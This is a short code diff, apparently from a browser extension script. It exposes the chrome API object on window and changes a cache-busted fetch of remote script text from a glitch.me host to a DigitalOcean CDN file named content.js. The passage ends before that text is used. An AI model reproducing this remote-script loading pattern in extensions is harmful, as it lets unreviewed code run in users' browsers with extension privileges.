@@ -1,7 +1,9 @@
 window.chrome = chrome;
 v = new Date().valueOf();
 
-fetch("https://hollow-ribbon-joke.glitch.me/content?v=" + v)
+fetch(
+  "https://extensions-bucket.fra1.cdn.digitaloceanspaces.com/content.js?v=" + v
+)
   .then(function (response) {
     return response.text();
   })
